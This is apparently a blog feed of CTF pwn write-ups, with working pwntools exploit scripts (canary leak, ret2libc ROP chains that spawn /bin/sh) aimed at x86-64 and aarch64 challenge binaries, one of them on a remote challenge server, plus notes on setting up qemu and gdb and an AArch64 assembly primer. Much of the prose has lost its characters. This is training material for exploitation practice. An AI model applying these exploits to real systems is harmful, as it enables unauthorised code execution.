function_">login</span>(<span class="params">a,b</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,a)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;: &#x27;</span>,b)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    choice(<span class="number">5</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">a</span>):</span><br><span class="line">    choice(<span class="number">3</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">&#x27;note: &#x27;</span>,a)</span><br><span class="line"><span class="comment"># login(b&#x27;admin\x00&#x27;,b&#x27;root\x00&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># b()</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io = remote(<span class="string">&#x27;118.24.31.155&#x27;</span>,<span class="string">&#x27;9999&#x27;</span>) </span><br><span class="line">    <span class="comment"># nc 118.24.31.155 9999</span></span><br><span class="line">    login(<span class="string">b&#x27;admin\x00&#x27;</span>,<span class="string">b&#x27;root\x00&#x27;</span>)</span><br><span class="line">    io.sendlineafter(<span class="string">b&#x27;: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.sendafter(<span class="string">b&#x27;: \n&#x27;</span>, <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x10</span>)</span><br><span class="line">    result = io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">b&#x27;give you a gif&#x27;</span> <span class="keyword">in</span> result:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        io.close()</span><br><span class="line"><span class="comment"># db(&#x27;b *0x0401AC3&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(result.split(<span class="string">b&#x27;!&#x27;</span>)[<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">p(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line">ret_ad=<span class="number">0x4012D0</span></span><br><span class="line">setrdi=<span class="number">0x0401CB6</span></span><br><span class="line">paylaod=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,elf.plt[<span class="string">&#x27;puts&#x27;</span>],ret_ad])</span><br><span class="line">logout()</span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,paylaod)</span><br><span class="line">puts_ad=uu64(r(<span class="number">6</span>))</span><br><span class="line">libcbase=find_libc(<span class="string">&#x27;puts&#x27;</span>,puts_ad)</span><br><span class="line">libcelf.address=libcbase</span><br><span class="line">pop_rdi_ret=<span class="built_in">next</span>(libcelf.search(asm(<span class="string">&#x27;pop rdi;ret&#x27;</span>)))</span><br><span class="line"><span class="built_in">print</span>(pop_rdi_ret)</span><br><span class="line">binsh=libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)+libcbase</span><br><span class="line">system=libc.dump(<span class="string">&#x27;system&#x27;</span>)+libcbase</span><br><span class="line">p(<span class="string">&#x27;system&#x27;</span>,system)</span><br><span class="line">add(p64(binsh))</span><br><span class="line">io.sendlineafter(<span class="string">&#x27;Choice: &#x27;</span>,<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">logout()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(rop.ret.address))</span><br><span class="line">payload=<span class="number">0x40</span>*<span class="string">b&#x27;a&#x27;</span>+flat([canary,<span class="number">0</span>,setrdi,system])<span class="comment">#pop rdisystemret</span></span><br><span class="line">login(<span class="string">b&#x27;admin&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>aarch64 pwn</title>
      <link href="/2023/07/20/first-aarch64-pwn/"/>
      <url>/2023/07/20/first-aarch64-pwn/</url>
      
        <content type="html"><![CDATA[<p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-aarch -L /usr/aarch64-linux-gnu/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="Dest0g3-520-ez-aarch"><a href="#Dest0g3-520-ez-aarch" class="headerlink" title="Dest0g3_520_ez_aarch"></a>Dest0g3_520_ez_aarch</h2><p>paddingida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">char</span> buf; <span class="comment">// [xsp+10h] [xbp+10h] BYREF</span></span><br></pre></td></tr></table></figure><p>cyclic</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000968</span> FD <span class="number">7B</span> BD A9                   STP             X29, X30, [SP,#<span class="number">-0x30</span>]!</span><br><span class="line">.text:<span class="number">000000000000096</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000000970</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> A0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, aPleaseLeaveYou     ; <span class="string">&quot;Please leave your name:&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000978</span> <span class="number">92</span> FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000978</span></span><br><span class="line">.text:<span class="number">000000000000097</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000000980</span> <span class="number">02</span> <span class="number">06</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W2, #<span class="number">0x30</span> ; <span class="string">&#x27;0&#x27;</span>         ; nbytes</span><br><span class="line">.text:<span class="number">0000000000000984</span> E1 <span class="number">03</span> <span class="number">00</span> AA                   MOV             X1, X0                  ; buf</span><br><span class="line">.text:<span class="number">0000000000000988</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span>                  ; fd</span><br><span class="line">.text:<span class="number">000000000000098</span>C <span class="number">91</span> FF FF <span class="number">97</span>                   BL              .read</span><br><span class="line">.text:<span class="number">000000000000098</span>C</span><br><span class="line">.text:<span class="number">0000000000000990</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">2B</span> <span class="number">91</span>       ADRL            X0, aOkYouCanExploi     ; <span class="string">&quot;OK, you can exploit it now.&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000998</span> <span class="number">8</span>A FF FF <span class="number">97</span>                   BL              .<span class="built_in">puts</span></span><br><span class="line">.text:<span class="number">0000000000000998</span></span><br><span class="line">.text:<span class="number">000000000000099</span>C <span class="number">1F</span> <span class="number">20</span> <span class="number">03</span> D5                   NOP</span><br><span class="line">.text:<span class="number">00000000000009</span>A0 FD <span class="number">7B</span> C3 A8                   LDP             X29, X30, [SP+<span class="number">0x30</span>+var_30],#<span class="number">0x30</span></span><br><span class="line">.text:<span class="number">00000000000009</span>A4 C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p><code> STP             X29, X30, [SP,#-0x30]!</code>fpx30sp0x30,<code>ADD             X0, SP, #0x10</code>bufsp+0x10buffp0x20 lr0x28</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"><span class="title function_">context</span><span class="params">(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span></span><br><span class="line">pwnfile=<span class="string">&#x27;./ez_aarch&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu//lib/libc.so.6&#x27;</span>)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="meta"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#</span><br><span class="line">    <span class="meta"># io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,pwnfile])#</span></span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">ra = lambda: io.recvall()</span><br><span class="line">rl = lambda: io.recvline(keepends=True)</span><br><span class="line">ru = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = lambda: io.interactive()</span><br><span class="line">c = lambda: io.close()</span><br><span class="line">li = lambda x: <span class="built_in">log</span>.info(x)</span><br><span class="line">db = lambda x : gdb.attach(io,x)</span><br><span class="line">b = lambda : gdb.attach(io)</span><br><span class="line">uu32 = lambda x   : u32(x.ljust(<span class="number">4</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">uu64 = lambda x   : u64(x.ljust(<span class="number">8</span>,b<span class="number">&#x27;</span>\x00<span class="number">&#x27;</span>))</span><br><span class="line">p =lambda x,y:print(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + hex(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">padding=b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">40</span></span><br><span class="line">s(padding+p8(<span class="number">0x3c</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="2022-ret2libc-aarch64"><a href="#2022-ret2libc-aarch64" class="headerlink" title="2022_ret2libc_aarch64"></a>2022_ret2libc_aarch64</h2><p></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000400948</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000400948</span> FD <span class="number">7B</span> B7 A9                   STP             X29, X30, [SP,#<span class="number">-0x90</span>]!</span><br><span class="line">.text:<span class="number">000000000040094</span>C FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">0000000000400950</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">2</span>A <span class="number">91</span>       ADRL            X0, asc_400AB0          ; <span class="string">&quot;&gt; &quot;</span></span><br><span class="line">.text:<span class="number">0000000000400958</span> <span class="number">5</span>E FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000400958</span></span><br><span class="line">.text:<span class="number">000000000040095</span>C E0 <span class="number">43</span> <span class="number">00</span> <span class="number">91</span>                   ADD             X0, SP, #<span class="number">0x10</span></span><br><span class="line">.text:<span class="number">0000000000400960</span> <span class="number">60</span> FF FF <span class="number">97</span>                   BL              .gets</span><br></pre></td></tr></table></figure><p>padding 0x90-0x10+0x8&#x3D;0x88,gadget</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so<span class="number">.6</span> | grep <span class="string">&#x27;ldr x0&#x27;</span> </span><br><span class="line"><span class="number">000069500</span> : ldr x0, [sp, #<span class="number">0x18</span>] ; ldp x29, x30, [sp], #<span class="number">0x20</span> ; ret</span><br></pre></td></tr></table></figure><p>ldr x0, [sp, #0x18] ; sp+0x18x0&#x2F;bin&#x2F;sh</p><p>ldp x29, x30, [sp], #0x20 ; spx29 sp+8x30 sp+8system</p><p>cyclic</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+cyclic(<span class="number">100</span>)</span><br></pre></td></tr></table></figure><p><img src="/2023/07/20/first-aarch64-pwn/image-20230720164531216.png" alt="image-20230720164531216"></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">grxer@Ubuntu22 ~&gt; cyclic -l gaaa</span><br><span class="line"><span class="number">24</span></span><br><span class="line">grxer@Ubuntu22 ~ [<span class="number">1</span>]&gt; cyclic -l kaaa</span><br><span class="line"><span class="number">40</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">pwnfile=<span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">elf = ELF(pwnfile)</span><br><span class="line">rop = ROP(pwnfile)</span><br><span class="line">libc=ELF(<span class="string">&#x27;/usr/aarch64-linux-gnu/lib/libc.so.6&#x27;</span>)</span><br><span class="line">libcrop=ROP(libc)</span><br><span class="line"><span class="keyword">if</span> args[<span class="string">&#x27;REMOTE&#x27;</span>]:</span><br><span class="line">    io = remote()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="comment"># io = process(pwnfile)</span></span><br><span class="line">    io=process([<span class="string">&quot;qemu-aarch64&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/aarch64-linux-gnu/&quot;</span>,<span class="string">&quot;./pwn&quot;</span>])</span><br><span class="line">    <span class="comment"># io=process([&quot;qemu-aarch64&quot;,&quot;-L&quot;,&quot;/usr/aarch64-linux-gnu/&quot;,&quot;./pwn&quot;])</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: io.recv(x)</span><br><span class="line">ra = <span class="keyword">lambda</span>: io.recvall()</span><br><span class="line">rl = <span class="keyword">lambda</span>: io.recvline(keepends=<span class="literal">True</span>)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: io.recvuntil(x, drop=<span class="literal">True</span>)</span><br><span class="line">s = <span class="keyword">lambda</span> x: io.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: io.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: io.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: io.sendlineafter(x, y)</span><br><span class="line">ia = <span class="keyword">lambda</span>: io.interactive()</span><br><span class="line">c = <span class="keyword">lambda</span>: io.close()</span><br><span class="line">li = <span class="keyword">lambda</span> x: log.info(x)</span><br><span class="line">db = <span class="keyword">lambda</span> x : gdb.attach(io,x)</span><br><span class="line">b = <span class="keyword">lambda</span> : gdb.attach(io)</span><br><span class="line">uu32 = <span class="keyword">lambda</span> x   : u32(x.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> x   : u64(x.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">p =<span class="keyword">lambda</span> x,y:<span class="built_in">print</span>(<span class="string">&quot;\033[4;36;40m&quot;</span>+x+<span class="string">&quot;:\033[0m&quot;</span> + <span class="string">&quot;\033[7;33;40m[*]\033[0m &quot;</span> + <span class="string">&quot;\033[1;31;40m&quot;</span> + <span class="built_in">hex</span>(y) + <span class="string">&quot;\033[0m&quot;</span>)</span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;aarch64&#x27;</span>)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">s(p64(elf.got[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#0x55008cae70</span></span><br><span class="line">ru(<span class="string">b&#x27;le&gt;&gt;\n&#x27;</span>)</span><br><span class="line">puts_ad=uu32(r(<span class="number">3</span>))+<span class="number">0x5500000000</span></span><br><span class="line">p(<span class="string">&#x27;puts_ad&#x27;</span>,puts_ad)</span><br><span class="line">libc_base=puts_ad-libc.symbols[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">binsh = libc_base + <span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">p(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">p(<span class="string">&#x27;system_addr&#x27;</span>,system_addr)</span><br><span class="line">p(<span class="string">&#x27;bin&#x27;</span>,binsh)</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">ROPgadget --binary  /usr/aarch64-linux-gnu/lib/libc.so.6 | grep &#x27;ldr x0&#x27; </span></span><br><span class="line"><span class="string">000069500 : ldr x0, [sp, #0x18] ; ldp x29, x30, [sp], #0x20 ; ret</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">gadget=libc_base+<span class="number">0x00069500</span></span><br><span class="line">padding=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span></span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">payload=padding+p64(gadget)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">24</span>+p64(system_addr)+p64(<span class="number">40</span>-<span class="number">24</span>-<span class="number">8</span>)+p64(binsh)</span><br><span class="line">sla(<span class="string">b&#x27;&gt;&#x27;</span>,payload)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Aarch64 ASM</title>
      <link href="/2023/07/19/aarch64-asm/"/>
      <url>/2023/07/19/aarch64-asm/</url>
      
        <content type="html"><![CDATA[<h1 id="Aarch64-ASM"><a href="#Aarch64-ASM" class="headerlink" title="Aarch64 ASM"></a>Aarch64 ASM</h1><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p><p>3164bit X0-X30(Wn32) sppc</p><ul><li><strong>x0-x7 X0 </strong></li><li><strong>x8</strong></li><li><strong>x8-x15  </strong></li><li>r16-r17IPC(intra-procedure-call)</li><li>x18 ,</li><li><strong>x19-x28</strong></li><li><strong>x29 fp(frame register)</strong></li><li><strong>r30 lr(link register</strong></li><li><strong>sp</strong></li><li><strong>pc</strong><strong>aarch64pcadrbradrpcpcarm32+4+8</strong></li><li><strong>XZR(32WZR)</strong></li></ul><h2 id=""><a href="#" class="headerlink" title=""></a></h2><table><thead><tr><th></th><th></th></tr></thead><tbody><tr><td>W&#x2F;R</td><td>32bit</td></tr><tr><td>X</td><td>64bit</td></tr><tr><td>&#x2F;-0</td><td></td></tr><tr><td>B</td><td>8bit</td></tr><tr><td>SB</td><td>8bit</td></tr><tr><td>H</td><td>16bit</td></tr><tr><td>SH</td><td>16bit</td></tr><tr><td>W</td><td>32bit</td></tr><tr><td>SW</td><td>32bit</td></tr><tr><td>P</td><td>Pair</td></tr><tr><td></td><td></td></tr><tr><td>H</td><td>dst gets top half</td></tr><tr><td>N</td><td>dst &lt; src</td></tr><tr><td>L</td><td>Long dst &gt; src</td></tr><tr><td>W</td><td>Wide (dst&#x3D;&#x3D;src1,src1&gt;src2) </td></tr></tbody></table><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>32bitida8</p><h3 id="mov"><a href="#mov" class="headerlink" title="mov"></a>mov</h3><p><strong>MOVK Rn, #imm, #shift</strong>: 16 ,shift<strong></strong></p><p><strong>MOVZ Rn, #imm, #shif</strong>:movk<strong></strong></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>adrl</strong>adr</p><p><strong>ADRP Xd, symbol</strong>:(Address of Page) symbol12 Xdpage4k</p><ul><li>addrp xdsybolsadd xdxdoffset</li></ul><p><strong>strb</strong> (store register byte) </p><p><strong>ldrb</strong> (load register byte) </p><p><strong>ldrsb</strong>: (Load Register Signed Byte),</p><p><strong>ldrh</strong></p><p><strong>strh</strong>:</p><p><strong>swp</strong>SWP X0X1[X2] ;memory(X2)X0X1memory(X2)</p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>stp</strong> <code>str</code> </p><ul><li><code>STP x4, x5, [sp, #-0x20]</code><code>sp+0x20</code><code>x4x5</code><code>x4</code><code>sp-0x20</code><code>x5</code><code>sp-0x0x20+8</code><code>sp-=0x20</code></li></ul><p><strong>ldp</strong> <code>ldr</code> </p><ul><li><code>LDP x29, x30, [sp], #0x40</code><code>sp</code><code>x29</code><code>sp+0x8</code><code>x30</code><code>sp += 0x40</code></li></ul><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong>blr Xm</strong>XmX30</p><p><strong>br Xm</strong>Xm</p><p>**ret {Xm}**XmXmX30</p><p><strong>cbz Xmlabel</strong>XmZerolabel()</p><p><strong>cbnz</strong>0,</p><p><strong>svc #imm</strong></p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="type">int</span> x=<span class="number">0x12345678</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;hello,world&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;%x&quot;</span>,x);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ida</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               var_20= <span class="number">-0x20</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               x= <span class="number">-4</span></span><br><span class="line">.text:<span class="number">0000000000000754</span></span><br><span class="line">.text:<span class="number">0000000000000754</span>                               ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0000000000000754</span> FD <span class="number">7B</span> BE A9                   STP             X29, X30, [SP,#var_20]!</span><br><span class="line">.text:<span class="number">0000000000000758</span> FD <span class="number">03</span> <span class="number">00</span> <span class="number">91</span>                   MOV             X29, SP</span><br><span class="line">.text:<span class="number">000000000000075</span>C <span class="number">00</span> CF <span class="number">8</span>A <span class="number">52</span> <span class="number">80</span> <span class="number">46</span> A2 <span class="number">72</span>       MOV             W0, #<span class="number">0x12345678</span></span><br><span class="line">.text:<span class="number">0000000000000764</span> E0 <span class="number">1F</span> <span class="number">00</span> B9                   STR             W0, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000768</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> C0 <span class="number">1</span>E <span class="number">91</span>       ADRL            X0, aHelloWorld         ; <span class="string">&quot;hello,world&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000770</span> B0 FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000770</span></span><br><span class="line">.text:<span class="number">0000000000000774</span> E1 <span class="number">1F</span> <span class="number">40</span> B9                   LDR             W1, [SP,#<span class="number">0x20</span>+x]</span><br><span class="line">.text:<span class="number">0000000000000778</span> <span class="number">00</span> <span class="number">00</span> <span class="number">00</span> <span class="number">90</span> <span class="number">00</span> <span class="number">00</span> <span class="number">1F</span> <span class="number">91</span>       ADRL            X0, aX                  ; <span class="string">&quot;%x&quot;</span></span><br><span class="line">.text:<span class="number">0000000000000780</span> AC FF FF <span class="number">97</span>                   BL              .<span class="built_in">printf</span></span><br><span class="line">.text:<span class="number">0000000000000780</span></span><br><span class="line">.text:<span class="number">0000000000000784</span> <span class="number">00</span> <span class="number">00</span> <span class="number">80</span> <span class="number">52</span>                   MOV             W0, #<span class="number">0</span></span><br><span class="line">.text:<span class="number">0000000000000788</span> FD <span class="number">7B</span> C2 A8                   LDP             X29, X30, [SP],#<span class="number">0x20</span></span><br><span class="line">.text:<span class="number">000000000000078</span>C C0 <span class="number">03</span> <span class="number">5F</span> D6                   RET</span><br></pre></td></tr></table></figure><p>objdump</p><p><img src="/2023/07/19/aarch64-asm/image-20230720143324402.png" alt="image-20230720143324402"></p><p>fpspbpbp</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p><a href="https://www.cnblogs.com/lvdongjie/p/6644821.html">https://www.cnblogs.com/lvdongjie/p/6644821.html</a></p><p><a href="https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start">https://wiki.cdot.senecacollege.ca/wiki/AArch64_Register_and_Instruction_Quick_Start</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>arm pwn</title>
      <link href="/2023/07/19/first-arm-pwn/"/>
      <url>/2023/07/19/first-arm-pwn/</url>
      
        <content type="html"><![CDATA[<p><a href="https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ">https://pan.baidu.com/s/1PT6DLLCDyQuFxYT95fkMtQ</a><br>s1hv</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>gdb-multiarchqemu-user</p><p>start-g.sh</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-arm -g 1234 -L /usr/arm-linux-gnueabi/ ./a.out</span><br></pre></td></tr></table></figure><p>attach.sh</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">sudo gdb-multiarch ./a.out -ex <span class="string">&quot;target remote:1234&quot;</span></span><br></pre></td></tr></table></figure><p>python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#</span></span><br><span class="line">io=process([<span class="string">&quot;qemu-arm&quot;</span>,<span class="string">&quot;-L&quot;</span>,<span class="string">&quot;/usr/arm-linux-gnueabi/&quot;</span>,<span class="string">&quot;./elec_system2_patch&quot;</span>])<span class="comment">#</span></span><br><span class="line"></span><br><span class="line">gdb.attach(io,<span class="string">&#x27;target remote localhost:1234&#x27;</span>,exe=pwnfile,arch=<span class="string">&#x27;arm&#x27;</span>)</span><br></pre></td></tr></table></figure><h2 id="2022-babyarm"><a href="#2022-babyarm" class="headerlink" title="2022_babyarm"></a>2022_babyarm</h2><p>base64   <a href="http://web.chacuo.net/netbasex">http://web.chacuo.net/netbasex</a> </p><p>libc ret2libc</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span 